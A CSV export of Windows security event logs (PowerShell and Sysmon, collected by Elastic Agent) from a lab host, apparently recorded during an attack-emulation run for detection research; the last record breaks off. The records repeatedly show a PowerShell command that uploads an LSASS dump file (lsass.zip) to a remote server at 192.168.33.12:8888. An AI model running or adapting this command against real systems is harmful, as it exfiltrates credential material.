@timestamp,_score,agent.ephemeral_id,agent.hostname,agent.id,agent.name,agent.type,agent.version,data_stream.dataset,data_stream.namespace,data_stream.type,ecs.version,elastic_agent.id,elastic_agent.snapshot,elastic_agent.version,event.action,event.agent_id_status,event.category,event.code,event.created,event.dataset,event.ingested,event.kind,event.module,event.provider,event.type,file.code_signature.status,file.code_signature.subject_name,file.code_signature.valid,file.directory,file.extension,file.hash.md5,file.hash.sha1,file.hash.sha256,file.name,file.path,file.pe.company,file.pe.description,file.pe.file_version,file.pe.imphash,file.pe.original_file_name,file.pe.product,host.architecture,host.hostname,host.id,host.ip,host.mac,host.name,host.os.build,host.os.family,host.os.kernel,host.os.name,host.os.name.text,host.os.platform,host.os.type,host.os.version,input.type,log.file.path,log.level,log.logger,log.offset,log.origin.file.line,log.origin.file.name,message,monitoring.ecs.version,monitoring.metrics.beat.cpu.system.ticks,monitoring.metrics.beat.cpu.system.time.ms,monitoring.metrics.beat.cpu.total.ticks,monitoring.metrics.beat.cpu.total.time.ms,monitoring.metrics.beat.cpu.total.value,monitoring.metrics.beat.cpu.user.ticks,monitoring.metrics.beat.cpu.user.time.ms,monitoring.metrics.beat.handles.open,monitoring.metrics.beat.info.ephemeral_id,monitoring.metrics.beat.info.uptime.ms,monitoring.metrics.beat.info.version,monitoring.metrics.beat.memstats.gc_next,monitoring.metrics.beat.memstats.memory_alloc,monitoring.metrics.beat.memstats.memory_total,monitoring.metrics.beat.memstats.rss,monitoring.metrics.beat.runtime.goroutines,monitoring.metrics.filebeat.events.active,monitoring.metrics.filebeat.events.added,monitoring.metrics.filebeat.events.done,monitoring.metrics.filebeat.harvester.open_files,monitoring.metrics.filebeat.harvester.running,monitoring.metrics.libbeat.config.module.running,monitoring.metrics.libbeat.output.events.acked,monitoring.metrics.libbeat.output.events.active,monitoring.metrics.libbeat.output.events.batches,monitoring.metrics.libbeat.output.events.total,monitoring.metrics.libbeat.output.read.bytes,monitoring.metrics.libbeat.output.read.errors,monitoring.metrics.libbeat.output.write.bytes,monitoring.metrics.libbeat.pipeline.clients,monitoring.metrics.libbeat.pipeline.events.active,monitoring.metrics.libbeat.pipeline.events.published,monitoring.metrics.libbeat.pipeline.events.total,monitoring.metrics.libbeat.pipeline.queue.acked,monitoring.metrics.metricbeat.windows.perfmon.events,monitoring.metrics.metricbeat.windows.perfmon.success,monitoring.metrics.metricbeat.windows.service.events,monitoring.metrics.metricbeat.windows.service.success,monitoring.metrics.registrar.states.current,process.args,process.args_count,process.command_line,process.entity_id,process.executable,process.hash.md5,process.hash.sha1,process.hash.sha256,process.name,process.parent.args,process.parent.args_count,process.parent.command_line,process.parent.entity_id,process.parent.executable,process.parent.name,process.parent.pid,process.pe.company,process.pe.description,process.pe.file_version,process.pe.imphash,process.pe.original_file_name,process.pe.product,process.pid,process.thread.id,process.working_directory,registry.data.strings,registry.data.type,registry.hive,registry.key,registry.path,registry.value,related.hash,related.user,rule.name,service.name,sysmon.file.archived,sysmon.file.is_executable,user.domain,user.id,user.name,winlog.api,winlog.channel,winlog.computer_name,winlog.event_data.CallTrace,winlog.event_data.Company,winlog.event_data.CreationUtcTime,winlog.event_data.Description,winlog.event_data.EventType,winlog.event_data.FileVersion,winlog.event_data.GrantedAccess,winlog.event_data.IntegrityLevel,winlog.event_data.LogonGuid,winlog.event_data.LogonId,winlog.event_data.ParentUser,winlog.event_data.Product,winlog.event_data.Signature,winlog.event_data.SignatureStatus,winlog.event_data.Signed,winlog.event_data.SourceUser,winlog.event_data.TargetImage,winlog.event_data.TargetProcessGUID,winlog.event_data.TargetProcessId,winlog.event_data.TargetUser,winlog.event_data.TerminalSessionId,winlog.event_id,winlog.opcode,winlog.process.pid,winlog.process.thread.id,winlog.provider_guid,winlog.provider_name,winlog.record_id,winlog.task,winlog.user.domain,winlog.user.identifier,winlog.user.name,winlog.user.type,winlog.version
"Oct 21, 2022 @ 03:08:25.732",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Engine Lifecycle,verified,process,403,"Oct 21, 2022 @ 03:08:26.762",windows.powershell,"Oct 21, 2022 @ 03:08:49.000",event,windows,PowerShell,17,end,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=5.1.17763.1852
	RunspaceId=bde48661-68d6-4497-8031-ceecb4afd9c6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,Stopped,Available,5.1.17763.1852,-,-,-,-,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,Info,-,-,-,PowerShell,1552,Engine Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:25.518",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Executing Pipeline,verified,process,4103,"Oct 21, 2022 @ 03:08:27.012",windows.powershell_operational,"Oct 21, 2022 @ 03:08:50.000",event,windows,Microsoft-Windows-PowerShell,16,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""AssemblyName""; value=""System.Net.Http""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.1852
        Host ID = 41289939-8716-49c9-9f2c-1b307dfe45d7
        Host Application = powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
        Engine Version = 5.1.17763.1852
        Runspace ID = bde48661-68d6-4497-8031-ceecb4afd9c6
        Pipeline ID = 4
        Command Name = Add-Type
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 16
        User = VAGRANT\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"""AssemblyName""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""System.Net.Http""",Add-Type,Cmdlet,-,-,-,5.1.17763.1852,-,-,Microsoft.PowerShell,4,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode();",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,vagrant,-,-,-,-,VAGRANT,S-1-5-21-31245427-1393067093-28759700-1000,vagrant,{854ef8cf-e546-0001-c924-4f8546e5d801},wineventlog,Microsoft-Windows-PowerShell/Operational,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4103,-,To be used when operation is just executing a method,"7,036","7,212",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,837,Executing Pipeline,VAGRANT,S-1-5-21-31245427-1393067093-28759700-1000,vagrant,User,1
"Oct 21, 2022 @ 03:08:25.511",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Pipeline Execution Details,verified,process,800,"Oct 21, 2022 @ 03:08:26.762",windows.powershell,"Oct 21, 2022 @ 03:08:49.000",event,windows,PowerShell,15,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Pipeline execution details for command line: $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); . 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=15

	UserId=VAGRANT\vagrant
	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=5.1.17763.1852
	RunspaceId=bde48661-68d6-4497-8031-ceecb4afd9c6
	PipelineId=4
	ScriptName=
	CommandLine=$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode();  

Details: 
CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""AssemblyName""; value=""System.Net.Http""",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"""AssemblyName""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""System.Net.Http""",-,-,"$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",-,-,5.1.17763.1852,-,-,-,4,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,1,1,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,vagrant,-,-,-,-,VAGRANT,-,vagrant,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,800,Classic,-,-,-,-,PowerShell,1551,Pipeline Execution Details,-,-,-,-,-
"Oct 21, 2022 @ 03:08:25.497",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Execute a Remote Command,verified,process,4104,"Oct 21, 2022 @ 03:08:27.012",windows.powershell_operational,"Oct 21, 2022 @ 03:08:50.000",event,windows,Microsoft-Windows-PowerShell,-,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,warning,-,-,-,-,"Creating Scriptblock text (1 of 1):
$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 

ScriptBlock ID: f6d8596e-d9d8-41a0-8970-257cebb94585
Path: ",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,f6d8596e-d9d8-41a0-8970-257cebb94585,"$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",-,-,-,-,-,-,1,1,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,S-1-5-21-31245427-1393067093-28759700-1000,-,{854ef8cf-e546-0001-c824-4f8546e5d801},wineventlog,Microsoft-Windows-PowerShell/Operational,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4104,-,On create calls,"7,036","7,212",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,836,Execute a Remote Command,VAGRANT,S-1-5-21-31245427-1393067093-28759700-1000,vagrant,User,1
"Oct 21, 2022 @ 03:08:25.134",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.sysmon_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Process Create (rule: ProcessCreate),verified,process,1,"Oct 21, 2022 @ 03:08:27.002",windows.sysmon_operational,"Oct 21, 2022 @ 03:08:50.000",event,windows,Microsoft-Windows-Sysmon,-,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2022-10-21 07:08:25.134
ProcessGuid: {7a53022b-4569-6352-c601-000000000b00}
ProcessId: 5700
Image: C:\Program Files\Git\cmd\git.exe
FileVersion: -
Description: Git for Windows
Product: Git
Company: The Git Development Community
OriginalFileName: git.exe
CommandLine: ""C:\Program Files\Git\cmd\git.exe"" help -a
CurrentDirectory: C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\
User: VAGRANT\vagrant
LogonGuid: {7a53022b-2aa0-6352-661a-050000000000}
LogonId: 0x51A66
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=621E3677D88C56BD0797A48D6BEAE682B8255027,MD5=602F5931006B9AA2BDD04D43CFC3EC39,SHA256=6C4DBB77D05CA5C482CE3782255F56BB904445809F1DF3B655E2505EAC7FA0B2,IMPHASH=B5C28AB8B10670F75EB53AFFC23558E6
ParentProcessGuid: {7a53022b-4566-6352-c301-000000000b00}
ParentProcessId: 7036
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
